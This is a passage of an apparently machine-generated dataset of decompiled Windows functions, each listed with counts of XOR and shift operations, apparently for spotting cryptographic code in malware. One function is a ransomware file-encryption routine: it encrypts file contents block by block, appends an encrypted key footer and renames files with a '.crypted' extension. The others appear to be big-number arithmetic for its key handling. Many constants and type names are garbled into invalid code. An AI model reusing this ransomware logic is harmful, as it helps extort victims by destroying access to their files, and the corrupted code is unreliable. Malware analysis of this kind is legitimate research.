[esp+14h] [ebp-34h]\n  unsigned int v36; // [esp+1Ch] [ebp-2Ch]\n  int v37; // [esp+24h] [ebp-24h]\n  int v39; // [esp+2Ch] [ebp-1Ch]\n  unsigned int v41; // [esp+34h] [ebp-14h]\n  unsigned int v42; // [esp+34h] [ebp-14h]\n  _DWORD *lpMem; // [esp+38h] [ebp-10h]\n  unsigned int v44; // [esp+3Ch] [ebp-Ch]\n  unsigned int v45; // [esp+40h] [ebp-8h]\n  unsigned int v46; // [esp+44h] [ebp-4h]\n  unsigned int v47; // [esp+44h] [ebp-4h]\n  unsigned int v48; // [esp+50h] [ebp+8h]\n  unsigned int v49; // [esp+50h] [ebp+8h]\n  unsigned int *v50; // [esp+54h] [ebp+Ch]\n  unsigned int v51; // [esp+58h] [ebp+10h]\n\n  v5 = a1;\n  v6 = *a5;\n  lpMem = 0;\n  v33 = *a5;\n  v44 = a5[1];\n  v45 = a5[2];\n  v46 = a5[3];\n  if ( *a5 )\n  {\n    ProcessHeap = GetProcessHeap();\n    lpMem = HeapAlloc(ProcessHeap, 8u, 4 * a4);\n    v8 = sub_406241((int)lpMem, a3, a4, v6);\n    v9 = lpMem;\n    v5 = a1;\n    v10 = v8;\n  }\n  else\n  {\n    v9 = (_DWORD *)a3;\n    v10 = 0;\n  }\n  v51 = v10;\n  v11 = (unsigned __int16)v46;\n  result = v9[a4 - 1];\n  v47 = HIC461(v46);\n  v37 = v11;\n  v13 = (char *)v9 - v5;\n  v39 = a4 - 2;\n  v14 = (unsigned int *)(v5 + 4 * (a4 - 2));\n  v15 = v51;\n  v36 = HIC461(v45);\n  v50 = v14;\n  v34 = v13;\n  do\n  {\n    v16 = HIC461(v15) * v37;\n    v48 = *(unsigned int *)((char *)v14 + (_DWORD)v13);\n    v17 = HIC461(v15) * v47;\n    v18 = (unsigned __int16)v15;\n    v19 = (unsigned __int16)v15 * v37;\n    v41 = v16 + v18 * v47 + HIC461(v19);\n    v20 = v17 + 0x10000;\n    if ( v41 >= v16 )\n      v20 = v17;\n    v21 = (unsigned __int16)v19 + (v41 << 16);\n    v22 = HIC461(v41);\n    v42 = v51 + HIC461(v41) + v20 + (v21 + result < v21);\n    v35 = v22 + v20 + (v21 + result < v21) + 1 + v51;\n    v23 = __PA2EBE__(result, v48) - v45;\n    v49 = v48 - v45;\n    v24 = v36 * (unsigned __int16)v42;\n    v25 = v24\n        + (unsigned __int16)v45 * HIC461(v42)\n        + (((unsigned __int16)v45 * (unsigned int)(unsigned __int16)v42) >> 16);\n    v26 = v36 * HIC461(v42) + 0x10000;\n    v27 = (unsigned __int16)(v45 * v42) + (v25 << 16);\n    if ( v25 >= v24 )\n      v26 = v36 * HIC461(v42);\n    v28 = HI92D0D(v23) - v44 * v35 - (HIC461(v25) + (v49 < v27) + v26);\n    v29 = (v28 < v21 + result) - 1;\n    v30 = v29 + v35;\n    result = v49 - v27 + (v45 & v29);\n    v15 = (result < v49 - v27) + (v44 & v29) + v28;\n    v51 = v15;\n    if ( v15 >= v44 && (v15 > v44 || result >= v45) )\n    {\n      ++v30;\n      v15 = (__PA2EBE__(v15, result) - __PA2EBE__(v44, v45)) >> 32;\n      result -= v45;\n      v51 = v15;\n    }\n    if ( a1 )\n      *v50 = v30;\n    v14 = v50 - 1;\n    v13 = v34;\n    --v39;\n    --v50;\n  }\n  while ( v39 >= 0 );\n  if ( v33 )\n  {\n    v31 = (result >> v33) | (v15 << (32 - v33));\n    v32 = GetProcessHeap();\n    HeapFree(v32, 0, lpMem);\n    result = (unsigned int)a2;\n    *a2 = v31;\n    a2[1] = v15 >> v33;\n  }\n  else\n  {\n    a2[1] = v15;\n    *a2 = result;\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "Function",
        "Total XOR and shift operations": 9,
        "XOR operations": 3,
        "Shift operations": 6,
        "Operation percentage": "3.44%",
        "Function Body": "\nDWORD __stdcall Function(HA6BA8 *lpThreadParameter)\n{\n  HA6BA8 *v1; // esi\n  DWORD TickCount; // eax\n  int v3; // ecx\n  DWORD v4; // eax\n  int v5; // edi\n  DWORD v6; // edx\n  char *v7; // esi\n  char v8; // al\n  char *v9; // ecx\n  __int128 *v10; // esi\n  DWORD LowPart; // edi\n  char *v12; // eax\n  int v13; // esi\n  int v14; // edx\n  char v15; // cl\n  unsigned int v16; // ecx\n  unsigned int v17; // edx\n  unsigned int v18; // ecx\n  HA6BA8 ProcessHeap; // eax\n  HA6BA8 v20; // eax\n  HA6BA8 v21; // eax\n  HA6BA8 v22; // eax\n  __int128 v23; // xmm0\n  void *v24; // edi\n  int v25; // ecx\n  HA6BA8 v26; // eax\n  HA6BA8 v27; // eax\n  HA6BA8 v28; // eax\n  HA6BA8 v29; // eax\n  const WCHAR *v30; // esi\n  int v31; // ecx\n  char *v32; // eax\n  int v33; // ecx\n  int *v34; // eax\n  int v35; // ecx\n  int *v36; // eax\n  HA6BA8 v38; // [esp-14h] [ebp-112F4h]\n  int v39; // [esp-14h] [ebp-112F4h]\n  HA6BA8 v40; // [esp-14h] [ebp-112F4h]\n  int v41; // [esp-10h] [ebp-112F0h]\n  int v42; // [esp-Ch] [ebp-112ECh]\n  int v43; // [esp-8h] [ebp-112E8h]\n  void *v44; // [esp-4h] [ebp-112E4h]\n  void *v45; // [esp-4h] [ebp-112E4h]\n  void *v46; // [esp-4h] [ebp-112E4h]\n  char v47; // [esp+17h] [ebp-112C9h]\n  DWORD v48; // [esp+18h] [ebp-112C8h]\n  unsigned __int8 *v49; // [esp+18h] [ebp-112C8h]\n  DWORD NumberOfBytesRead; // [esp+1Ch] [ebp-112C4h] BYREF\n  LARGE_IN60C0R liDistanceToMove; // [esp+20h] [ebp-112C0h]\n  LARGE_IN60C0R v52; // [esp+28h] [ebp-112B8h]\n  int v53; // [esp+30h] [ebp-112B0h]\n  unsigned int v54; // [esp+34h] [ebp-112ACh]\n  unsigned int HighPart; // [esp+38h] [ebp-112A8h]\n  unsigned int v56; // [esp+3Ch] [ebp-112A4h]\n  LARGE_IN60C0R FileSize; // [esp+40h] [ebp-112A0h] BYREF\n  DWORD NumberOfBytesWritten; // [esp+4Ch] [ebp-11294h] BYREF\n  __int128 v59; // [esp+50h] [ebp-11290h]\n  LP3DB7 lpMem[2]; // [esp+60h] [ebp-11280h]\n  int v61[24]; // [esp+78h] [ebp-11268h] BYREF\n  int Buffer[66]; // [esp+D8h] [ebp-11208h] BYREF\n  char v63[240]; // [esp+1E0h] [ebp-11100h] BYREF\n  __int128 v64; // [esp+2D0h] [ebp-11010h] BYREF\n  char v65[4096]; // [esp+2E0h] [ebp-11000h] BYREF\n  WCHAR String1[32768]; // [esp+12E0h] [ebp-10000h] BYREF\n\n  v1 = lpThreadParameter;\n  v47 = 0;\n  GetFileSizeEx(*lpThreadParameter, &FileSize);\n  memset(v61, 0, 0x5Cu);\n  memset(Buffer, 0, 0x104u);\n  SetFilePointerEx(*lpThreadParameter, (LARGE_IN60C0R)(FileSize.QuadPart - 260), 0, 0);\n  ReadFile(*lpThreadParameter, Buffer, 0x104u, &NumberOfBytesRead, 0);\n  if ( Buffer[64] != -14782C7478 )\n  {\n    TickCount = GetTickCount();\n    *(LARGE_IN60C0R *)&v61[1] = FileSize;\n    v61[0] = -11B8CD8018;\n    v61[3] = 0;\n    v61[4] = 0;\n    v61[6] = 5;\n    v54 = (1336BD813 * TickCount + 1) % 0xFFF33DFF;\n    v61[5] = v54;\n    sub_40F882((int)&v61[7], -1);\n    sub_40F882((int)&v61[15], v3);\n    sub_405DBE(v63, &v61[7]);\n    v64 = *(_OWORD *)&v61[15];\n    liDistanceToMove.QuadPart = 0i64;\n    v56 = 0;\n    v38 = *lpThreadParameter;\n    v52.LowPart = 0;\n    SetFilePointerEx(v38, 0i64, 0, 0);\n    liDistanceToMove.QuadPart = 0i64;\n    ReadFile(*lpThreadParameter, v65, 0x1000u, &NumberOfBytesRead, 0);\n    v4 = NumberOfBytesRead;\n    v48 = NumberOfBytesRead;\n    if ( NumberOfBytesRead )\n    {\n      v5 = v61[4];\n      HighPart = liDistanceToMove.HighPart;\n      v52.HighPart = liDistanceToMove.LowPart;\n      do\n      {\n        if ( v4 < 0x1000 )\n        {\n          v4 = (v4 + 31) & 0xFFF33DE0;\n          v48 = v4;\n          NumberOfBytesRead = v4;\n        }\n        v6 = v4;\n        v53 = v5;\n        v7 = v65;\n        if ( v4 )\n        {\n          do\n          {\n            v8 = *v7++;\n            v5 = dword_41DC04[(unsigned __int8)(v8 ^ HI47AA(v5))] ^ (v5 << 8);\n            --v6;\n          }\n          while ( v6 );\n          v4 = v48;\n          v53 = v5;\n        }\n        v61[4] = v5;\n        v9 = v65;\n        v49 = (unsigned __int8 *)v65;\n        v10 = &v64;\n        if ( v4 )\n        {\n          liDistanceToMove.LowPart = ((v4 - 1) >> 4) + 1;\n          LowPart = liDistanceToMove.LowPart;\n          do\n          {\n            v12 = v9;\n            v13 = (char *)v10 - v9;\n            v14 = 16;\n            do\n            {\n              v15 = (v12++)[v13];\n              *(v12 - 1) ^= v15;\n              --v14;\n            }\n            while ( v14 );\n            sub_40392D(v49, (int)v63);\n            v10 = (__int128 *)v49;\n            v9 = (char *)(v49 + 16);\n            v49 += 16;\n            --LowPart;\n          }\n          while ( LowPart );\n          v5 = v53;\n        }\n        v64 = *v10;\n        SetFilePointerEx(*lpThreadParameter, (LARGE_IN60C0R)__PA2EBE__(v56, v52.LowPart), 0, 0);\n        WriteFile(*lpThreadParameter, v65, NumberOfBytesRead, &NumberOfBytesWritten, 0);\n        v16 = v61[6];\n        if ( !v61[6] )\n          v16 = 1;\n        v54 = 1336BD813 * v54 + 1;\n        v17 = v54 % v16 + 1;\n        v18 = (v54 % v16 + 1i64 + __PA2EBE__(HighPart, v52.HighPart)) >> 32;\n        v52.HighPart += v17;\n        HighPart = v18;\n        v40 = *lpThreadParameter;\n        v56 = __PA2EBE__(v18, v52.HighPart) >> 20;\n        v52.LowPart = v52.HighPart << 12;\n        SetFilePointerEx(v40, (LARGE_IN60C0R)(__PA2EBE__(v18, v52.HighPart) << 12), 0, 0);\n        ReadFile(*lpThreadParameter, v65, 0x1000u, &NumberOfBytesRead, 0);\n        v4 = NumberOfBytesRead;\n        v48 = NumberOfBytesRead;\n      }\n      while ( NumberOfBytesRead );\n    }\n    memset(Buffer, 0, 0x104u);\n    Buffer[64] = -14782C7478;\n    ProcessHeap = GetProcessHeap();\n    v52.LowPart = (DWORD)HeapAlloc(ProcessHeap, 8u, 4u);\n    v20 = GetProcessHeap();\n    liDistanceToMove.LowPart = (DWORD)HeapAlloc(v20, 8u, 4u);\n    *(_QWORD *)&v59 = 1i64;\n    v21 = GetProcessHeap();\n    *((_QWORD *)&v59 + 1) = (unsigned int)HeapAlloc(v21, 8u, 4u) | 0x10F046000i64;\n    lpMem[0] = 0;\n    v22 = GetProcessHeap();\n    lpMem[1] = HeapAlloc(v22, 8u, 4u);\n    sub_40A03C(v39, v41, v42, v43, (int)&byte_42D784);\n    v23 = v59;\n    v24 = lpMem[1];\n    lpMem[0] = (LP3DB7)1;\n    *(_DWORD *)lpMem[1] = 65537;\n    sub_4090F1((int)Buffer, (int)v61, v25, v23, *(__int64 *)lpMem);\n    v44 = (void *)_mm_cvtsi128_si32(_mm_srli_si128((__m128i)v59, 8));\n    v26 = GetProcessHeap();\n    HeapFree(v26, 0, v44);\n    v27 = GetProcessHeap();\n    HeapFree(v27, 0, v24);\n    v45 = (void *)liDistanceToMove.LowPart;\n    v28 = GetProcessHeap();\n    HeapFree(v28, 0, v45);\n    v46 = (void *)v52.LowPart;\n    v29 = GetProcessHeap();\n    HeapFree(v29, 0, v46);\n    v1 = lpThreadParameter;\n    liDistanceToMove.QuadPart = 0i64;\n    SetFilePointerEx(*lpThreadParameter, 0i64, 0, 2u);\n    WriteFile(*lpThreadParameter, Buffer, 0x104u, &NumberOfBytesWritten, 0);\n    v47 = 1;\n  }\n  CloseHandle(*v1);\n  if ( v47 )\n  {\n    v30 = (const WCHAR *)(v1 + 1);\n    StrRStrIW(v30, 0, L\".crypted\");\n    lstrcpyW(String1, v30);\n    lstrcatW(String1, L\".crypted\");\n    MoveFileW(v30, String1);\n    v1 = lpThreadParameter;\n  }\n  sub_40A039(v1);\n  InterlockedExchangeAdd(&Addend, 1);\n  v31 = 4096;\n  v32 = v65;\n  do\n  {\n    *v32++ = 0;\n    --v31;\n  }\n  while ( v31 );\n  v33 = 92;\n  v34 = v61;\n  do\n  {\n    *(_BYTE *)v34 = 0;\n    v34 = (int *)((char *)v34 + 1);\n    --v33;\n  }\n  while ( v33 );\n  v35 = 260;\n  v36 = Buffer;\n  do\n  {\n    *(_BYTE *)v36 = 0;\n    v36 = (int *)((char *)v36 + 1);\n    --v35;\n  }\n  while ( v35 );\n  return 0;\n}\n// 400D16: variable 'v3' is possibly undefined\n// 40EDE8: variable 'v39' is possibly undefined\n// 40EDE8: variable 'v41' is possibly undefined\n// 40EDE8: variable 'v42' is possibly undefined\n// 40EDE8: variable 'v43' is possibly undefined\n// 4003D4: variable 'v25' is possibly undefined\n// 41DC04: using guessed type int dword_41DC04[];\n// 42D784: using guessed type char byte_42D784;\n\n"
    },
    {
        "Function": "sub_4081AF",
        "Total XOR and shift operations": 18,
        "XOR operations": 10,
        "Shift operations": 8,
        "Operation percentage": "2.28%",
        "Function Body": "\nint *__fastcall sub_4081AF(int *a1, _DWORD *a2, int a3, int *a4, int *a5)\n{\n  int v7; // eax\n  int *result; // eax\n  int v9; // ebx\n  HA6BA8 ProcessHeap; // eax\n  HA6BA8 v11; // eax\n  int v12; // edi\n  HA6BA8 v13; // eax\n  HA6BA8 v14; // eax\n  int v15; // ebx\n  HA6BA8 v16; // eax\n  HA6BA8 v17; // eax\n  int v18; // ecx\n  int v19; // edx\n  int v20; // eax\n  int i; // edx\n  bool v22; // sf\n  unsigned int v23; // ecx\n  int v24; // esi\n  int v25; // ecx\n  int v26; // eax\n  int j; // ecx\n  unsigned int v28; // esi\n  int v29; // ecx\n  unsigned int v30; // eax\n  unsigned int v31; // edx\n  unsigned int v32; // esi\n  int v33; // ecx\n  int *v34; // ecx\n  int *v35; // ecx\n  unsigned int v36; // eax\n  int v37; // esi\n  int v38; // ecx\n  int v39; // eax\n  int k; // ecx\n  unsigned int v41; // esi\n  int v42; // edx\n  int v43; // esi\n  int v44; // ecx\n  int v45; // eax\n  int v46; // ecx\n  char *v47; // edx\n  unsigned int *v48; // eax\n  unsigned int v49; // edx\n  bool v50; // cf\n  int v51; // eax\n  int v52; // eax\n  unsigned int v53; // edx\n  unsigned int *v54; // ecx\n  unsigned int v55; // edx\n  unsigned int v56; // eax\n  unsigned int v57; // eax\n  int v58; // esi\n  int v59; // ecx\n  int v60; // eax\n  int n; // ecx\n  unsigned int v62; // esi\n  int v63; // eax\n  int v64; // eax\n  int v65; // eax\n  int v66; // esi\n  int v67; // ecx\n  int v68; // eax\n  int m; // ecx\n  unsigned int v70; // esi\n  char *v71; // esi\n  int v72; // edi\n  int v73; // eax\n  int v74; // edi\n  char *v75; // eax\n  int v76; // ebx\n  char *v77; // esi\n  int v78; // eax\n  char *v79; // esi\n  int v80; // ecx\n  unsigned int v81; // eax\n  char *v82; // edx\n  int v83; // eax\n  int v84; // ecx\n  unsigned int *v85; // eax\n  signed int v86; // edx\n  unsigned int v87; // edx\n  bool v88; // zf\n  unsigned int v89; // eax\n  int *v90; // ecx\n  int *v91; // ecx\n  int v92; // eax\n  char *v93; // edi\n  _DWORD *v94; // edx\n  void *v95; // ecx\n  LP3DB7 v96; // eax\n  HA6BA8 v97; // eax\n  HA6BA8 v98; // eax\n  HA6BA8 v99; // eax\n  HA6BA8 v100; // eax\n  HA6BA8 v101; // eax\n  HA6BA8 v102; // eax\n  void *v103; // [esp-4h] [ebp-80h]\n  void *v104; // [esp-4h] [ebp-80h]\n  void *v105; // [esp-4h] [ebp-80h]\n  void *v106; // [esp-4h] [ebp-80h]\n  int v107; // [esp+10h] [ebp-6Ch] BYREF\n  int v108; // [esp+14h] [ebp-68h]\n  LP3DB7 v109; // [esp+18h] [ebp-64h]\n  int v110; // [esp+1Ch] [ebp-60h] BYREF\n  int v111; // [esp+20h] [ebp-5Ch]\n  char *v112; // [esp+24h] [ebp-58h]\n  int v113; // [esp+28h] [ebp-54h] BYREF\n  int v114; // [esp+2Ch] [ebp-50h]\n  LP3DB7 lpMem; // [esp+30h] [ebp-4Ch]\n  int Mem; // [esp+34h] [ebp-48h] BYREF\n  int v117; // [esp+38h] [ebp-44h]\n  int *v118; // [esp+3Ch] [ebp-40h]\n  int v119; // [esp+40h] [ebp-3Ch] BYREF\n  int v120; // [esp+44h] [ebp-38h]\n  char *v121; // [esp+48h] [ebp-34h]\n  int v122; // [esp+4Ch] [ebp-30h] BYREF\n  int v123; // [esp+50h] [ebp-2Ch]\n  LP3DB7 v124; // [esp+54h] [ebp-28h]\n  int *v125; // [esp+58h] [ebp-24h]\n  signed int v126; // [esp+5Ch] [ebp-20h]\n  unsigned int v127; // [esp+60h] [ebp-1Ch]\n  _DWORD *v128; // [esp+64h] [ebp-18h]\n  _DWORD *v129; // [esp+68h] [ebp-14h]\n  int v130; // [esp+6Ch] [ebp-10h]\n  LP3DB7 v131; // [esp+70h] [ebp-Ch]\n  unsigned int v132; // [esp+74h] [ebp-8h]\n  char *v133; // [esp+78h] [ebp-4h]\n  void *v134; // [esp+88h] [ebp+Ch]\n\n  v128 = 0;\n  v129 = a2;\n  v7 = a4[1];\n  v125 = a1;\n  if ( !v7 )\n  {\n    if ( a1 != a5 )\n      sub_40C928(a1, a5);\n    result = (int *)abs32(a1[1]);\n    a1[1] = (int)result;\n    if ( a2 )\n      goto LABEL_5;\n    return result;\n  }\n  if ( a5[1] )\n  {\n    v113 = 1;\n    v114 = 0;\n    ProcessHeap = GetProcessHeap();\n    lpMem = HeapAlloc(ProcessHeap, 8u, 4u);\n    Mem = 1;\n    v117 = 0;\n    v11 = GetProcessHeap();\n    v12 = 0;\n    v118 = (int *)HeapAlloc(v11, 8u, 4u);\n    v119 = 1;\n    v120 = 0;\n    v13 = GetProcessHeap();\n    v133 = (char *)HeapAlloc(v13, 8u, 4u);\n    v121 = v133;\n    v110 = 1;\n    v131 = 0;\n    v111 = 0;\n    v14 = GetProcessHeap();\n    v15 = 0;\n    v112 = (char *)HeapAlloc(v14, 8u, 4u);\n    v122 = 1;\n    v123 = 0;\n    v16 = GetProcessHeap();\n    v124 = HeapAlloc(v16, 8u, 4u);\n    v107 = 1;\n    v108 = 0;\n    v17 = GetProcessHeap();\n    v109 = HeapAlloc(v17, 8u, 4u);\n    if ( &v113 != a4 )\n    {\n      sub_40C928(&v113, a4);\n      if ( v114 < 0 )\n        v114 = -v114;\n    }\n    v18 = 0;\n    v19 = *(_DWORD *)lpMem;\n    if ( *(_DWORD *)lpMem )\n    {\nLABEL_20:\n      v20 = v19 & -v19;\n      for ( i = 0; (v20 & 0xFF9D5100) == 0; i += 8 )\n        v20 <<= 8;\n      if ( v20 >= 0 )\n      {\n        do\n        {\n          ++i;\n          v22 = (v20 & 0x40017300) != 0;\n          v20 *= 2;\n        }\n        while ( !v22 );\n      }\n      v23 = 32 * v18 - i + 31;\n    }\n    else\n    {\n      while ( ++v18 )\n      {\n        v19 = *((_DWORD *)lpMem + v18);\n        if ( v19 )\n          goto LABEL_20;\n      }\n      v23 = -1;\n    }\n    v132 = v23;\n    sub_407B82(&v113, (int)&v113, v23);\n    if ( &Mem != a5 )\n    {\n      sub_40C928(&Mem, a5);\n      if ( v117 < 0 )\n        v117 = -v117;\n    }\n    v24 = 0;\n    v25 = *v118;\n    if ( *v118 )\n    {\nLABEL_31:\n      v26 = v25 & -v25;\n      for ( j = 0; (v26 & 0xFF9D5100) == 0; j += 8 )\n        v26 <<= 8;\n      if ( v26 >= 0 )\n      {\n        do\n        {\n          ++j;\n          v22 = (v26 & 0x40017300) != 0;\n          v26 *= 2;\n        }\n        while ( !v22 );\n      }\n      v28 = 32 * v24 - j + 31;\n    }\n    else\n    {\n      while ( ++v24 )\n      {\n        v25 = v118[v24];\n        if ( v25 )\n          goto LABEL_31;\n      }\n      v28 = -1;\n    }\n    sub_407B82(&Mem, (int)&Mem, v28);\n    v29 = v114;\n    v30 = v28;\n    if ( v132 < v28 )\n      v30 = v132;\n    v31 = v132 - v30;\n    v126 = v30;\n    v32 = v28 - v30;\n    v132 -= v30;\n    if ( v114 < v117 )\n    {\n      v114 = v117;\n      v117 = v29;\n      v33 = v113;\n      v113 = Mem;\n      Mem = v33;\n      v34 = (int *)lpMem;\n      lpMem = v118;\n      v118 = v34;\n      v35 = a5;\n      a5 = a4;\n      v128 = v129;\n      v129 = 0;\n      v36 = v31;\n      v31 = v32;\n      a4 = v35;\n      v132 = v32;\n      v32 = v36;\n    }\n    if ( !sub_40F17B((int)&v122, v31) )\n    {\n      sub_4026B1(&v122, v132);\n      v15 = v123;\n    }\n    sub_402230((unsigned int *)&v107, &v113, &v113, &Mem);\n    sub_40D85F(&v107, (int)&v107, v132);\n    if ( !sub_40F17B((int)&v110, v32) )\n    {\n      sub_4026B1(&v110, v32);\n      v131 = (LP3DB7)v111;\n    }\n    v130 = v32 + v132;\n    if ( v114 <= 0 )\n    {\n      v71 = v133;\nLABEL_125:\n      sub_40D85F(&Mem, (int)&Mem, v126);\n      v72 = -v12;\n      v120 = v72;\n      sub_402230((unsigned int *)&v110, 0, a5, &Mem);\n      v131 = (LP3DB7)v111;\n      if ( v111 < 0 )\n      {\n        v131 = (LP3DB7)-v111;\n        v111 = -v111;\n      }\n      sub_402230((unsigned int *)&v107, 0, a4, &Mem);\n      v132 = v108;\n      if ( v108 < 0 )\n      {\n        v132 = -v108;\n        v108 = -v108;\n      }\n      v73 = v130;\n      if ( v130 )\n      {\n        while ( 1 )\n        {\n          v130 = v73 - 1;\n          if ( ((v72 != 0) & *(_DWORD *)v71) != 0 || ((v15 != 0) & *(_DWORD *)v124) != 0 )\n          {\n            if ( ((v72 ^ (unsigned int)v131) & 0x801FB100) != 0 )\n            {\n              v72 = sub_40EBB8(&v119, (int)&v119, (int)&v110);\n              v131 = (LP3DB7)v111;\n            }\n            else\n            {\n              v72 = sub_40F413(&v119, (int)&v119, (int)&v110);\n            }\n            if ( v120 < 0 )\n              v72 = -v72;\n            v120 = v72;\n            if ( ((v15 ^ v132) & 0x801FB100) != 0 )\n            {\n              v15 = sub_40F413(&v122, (int)&v122, (int)&v107);\n            }\n            else\n            {\n              v15 = sub_40EBB8(&v122, (int)&v122, (int)&v107);\n              v132 = v108;\n            }\n            v71 = v121;\n            v133 = v121;\n            if ( v123 < 0 )\n              v15 = -v15;\n            v123 = v15;\n          }\n          v126 = v72;\n          if ( v72 )\n          {\n            v74 = abs32(v72);\n            if ( v74 <= v119 )\n            {\n              v75 = v133;\n            }\n            else\n            {\n              v71 = (char *)sub_40ACF2(&v119, v74);\n              v75 = v121;\n              v133 = v121;\n            }\n            sub_4041FC(v71, v75, v74);\n            v72 = (__PA2EBE__(v74, *(_DWORD *)&v71[4 * v74 - 4]) - 1) >> 32;\n            if ( v126 < 0 )\n              v72 = -v72;\n          }\n          v120 = v72;\n          v126 = v15;\n          if ( v15 )\n          {\n            v76 = abs32(v15);\n            v77 = (char *)(v76 <= v122 ? v124 : sub_40ACF2(&v122, v76));\n            sub_4041FC(v77, (char *)v124, v76);\n            v15 = (__PA2EBE__(v76, *(_DWORD *)&v77[4 * v76 - 4]) - 1) >> 32;\n            if ( v126 < 0 )\n              v15 = -v15;\n          }\n          v73 = v130;\n          v123 = v15;\n          if ( !v130 )\n            break;\n          v71 = v133;\n        }\n      }\n      if ( ((v72 ^ (unsigned int)v131) & 0x801FB100) != 0 )\n      {\n        v78 = sub_40F413(&v110, (int)&v119, (int)&v110);\n        v79 = v133;\n      }\n      else\n      {\n        v78 = sub_40EBB8(&v110, (int)&v119, (int)&v110);\n        v79 = v121;\n        v72 = v120;\n        v133 = v121;\n      }\n      v130 = v78;\n      if ( v72 < 0 )\n      {\n        v78 = -v78;\n        v130 = v78;\n      }\n      v80 = v72;\n      v81 = abs32(v78);\n      v126 = v81;\n      if ( v72 < 0 )\n        v80 = -v72;\n      v82 = v112;\n      v131 = v112;\n      if ( v80 == v81 )\n      {\n        v84 = v80 - 1;\n        if ( v84 < 0 )\n        {\nLABEL_171:\n          v83 = 0;\n        }\n        else\n        {\n          v85 = (unsigned int *)&v112[4 * v84];\n          v86 = v79 - v112;\n          v126 = v79 - v112;\n          while ( 1 )\n          {\n            v87 = *(unsigned int *)((char *)v85 + v86);\n            v88 = v87 == *v85;\n            v127 = *v85;\n            v79 = v133;\n            if ( !v88 )\n              break;\n            v86 = v126;\n            --v85;\n            if ( --v84 < 0 )\n              goto LABEL_171;\n          }\n          v83 = v127 < v87 ? 1 : -1;\n        }\n        v82 = v112;\n      }\n      else\n      {\n        v83 = 2 * (v80 >= v126) - 1;\n      }\n      if ( v83 > 0 )\n      {\n        v72 = v130;\n        v119 = v110;\n        v131 = v79;\n        v79 = v82;\n        v133 = v82;\n        v89 = ((v15 ^ v132) & 0x801FB100) != 0\n            ? sub_40EBB8(&v122, (int)&v122, (int)&v107)\n            : sub_40F413(&v122, (int)&v122, (int)&v107);\n        v15 = v89;\n        if ( v123 < 0 )\n          v15 = -v89;\n      }\n      if ( a4[1] < 0 )\n        v72 = -v72;\n      if ( a5[1] < 0 )\n        v15 = -v15;\n      v90 = v125;\n      v125[1] = v117;\n      *v90 = Mem;\n      v134 = (void *)v90[2];\n      v90[2] = (int)v118;\n      v91 = v129;\n      if ( v129 )\n      {\n        v92 = v119;\n        v129[1] = v72;\n        v93 = (char *)v91[2];\n        *v91 = v92;\n        v91[2] = (int)v79;\n      }\n      else\n      {\n        v93 = v133;\n      }\n      v94 = v128;\n      if ( v128 )\n      {\n        v95 = (void *)v128[2];\n        *v128 = v122;\n        v96 = v124;\n        v94[1] = v15;\n        v94[2] = v96;\n        v124 = v95;\n      }\n      v103 = lpMem;\n      v97 = GetProcessHeap();\n      HeapFree(v97, 0, v103);\n      v98 = GetProcessHeap();\n      HeapFree(v98, 0, v134);\n      v99 = GetProcessHeap();\n      HeapFree(v99, 0, v93);\n      v104 = v131;\n      v100 = GetProcessHeap();\n      HeapFree(v100, 0, v104);\n      v105 = v124;\n      v101 = GetProcessHeap();\n      HeapFree(v101, 0, v105);\n      v106 = v109;\n      v102 = GetProcessHeap();\n      return (int *)HeapFree(v102, 0, v106);\n    }\n    v37 = 0;\n    v38 = *(_DWORD *)lpMem;\n    if ( *(_DWORD *)lpMem )\n    {\nLABEL_48:\n      v39 = v38 & -v38;\n      for ( k = 0; (v39 & 0xFF9D5100) == 0; k += 8 )\n        v39 <<= 8;\n      if ( v39 >= 0 )\n      {\n        do\n        {\n          ++k;\n          v22 = (v39 & 0x40017300) != 0;\n          v39 *= 2;\n        }\n        while ( !v22 );\n      }\n      v41 = 32 * v37 - k + 31;\n    }\n    else\n    {\n      while ( ++v37 )\n      {\n        v38 = *((_DWORD *)lpMem + v37);\n        if ( v38 )\n          goto LABEL_48;\n      }\n      v41 = -1;\n    }\n    sub_407B82(&v113, (int)&v113, v41);\n    sub_40D85F(&v122, (int)&v122, v41);\n    sub_40D85F(&v119, (int)&v119, v41);\n    v42 = v117;\n    v130 += v41;\n    v43 = v108;\n    v12 = v120;\n    v15 = v123;\n    v133 = (char *)v117;\n    v132 = v108;\n    while ( 1 )\n    {\n      v44 = v114;\n      if ( v114 != v42 )\n      {\n        v45 = 2 * (v114 >= v42) - 1;\n        goto LABEL_66;\n      }\n      if ( v114 < 0 )\n        break;\n      v46 = v114 - 1;\n      if ( v114 - 1 >= 0 )\n      {\n        v47 = (char *)((_BYTE *)lpMem - (_BYTE *)v118);\n        v127 = (_BYTE *)lpMem - (_BYTE *)v118;\n        v48 = (unsigned int *)&v118[v46];\n        while ( 1 )\n        {\n          v49 = *(unsigned int *)((char *)v48 + (_DWORD)v47);\n          v50 = *v48 < v49;\n          if ( *v48 != v49 )\n            break;\n          v47 = (char *)v127;\n          --v48;\n          if ( --v46 < 0 )\n            goto LABEL_64;\n        }\nLABEL_74:\n        v45 = v50 ? 1 : -1;\n        goto LABEL_65;\n      }\nLABEL_64:\n      v45 = 0;\nLABEL_65:\n      v42 = (int)v133;\n      v44 = v114;\n      v43 = v132;\nLABEL_66:\n      if ( !v45 )\n      {\n        v71 = v121;\n        v133 = v121;\n        goto LABEL_125;\n      }\n      if ( v45 >= 0 )\n      {\n        if ( (v44 ^ v42) < 0 )\n        {\n          v63 = sub_40EBB8(&v113, (int)&v113, (int)&Mem);\n          v133 = (char *)v117;\n        }\n        else\n        {\n          v63 = sub_40F413(&v113, (int)&v113, (int)&Mem);\n        }\n        if ( v114 < 0 )\n          v63 = -v63;\n        v114 = v63;\n        if ( (v15 ^ v43) < 0 )\n        {\n          v64 = sub_40F413(&v107, (int)&v122, (int)&v107);\n        }\n        else\n        {\n          v64 = sub_40EBB8(&v107, (int)&v122, (int)&v107);\n          v15 = v123;\n        }\n        v132 = v64;\n        if ( v15 < 0 )\n        {\n          v64 = -v64;\n          v132 = v64;\n        }\n        v108 = v64;\n        if ( ((v12 ^ (unsigned int)v131) & 0x801FB100) != 0 )\n        {\n          v65 = sub_40F413(&v110, (int)&v119, (int)&v110);\n        }\n        else\n        {\n          v65 = sub_40EBB8(&v110, (int)&v119, (int)&v110);\n          v12 = v120;\n        }\n        v131 = (LP3DB7)v65;\n        if ( v12 < 0 )\n        {\n          v65 = -v65;\n          v131 = (LP3DB7)v65;\n        }\n        v111 = v65;\n        v66 = 0;\n        v67 = *(_DWORD *)lpMem;\n        if ( *(_DWORD *)lpMem )\n        